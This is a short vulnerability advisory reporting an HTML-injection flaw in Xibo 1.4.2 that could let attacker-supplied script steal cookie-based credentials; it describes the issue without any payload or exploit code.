Xibo is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input.

Attacker-supplied HTML and script code could be executed in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user; other attacks are also possible.

Xibo 1.4.2 is vulnerable; other versions may also be affected.
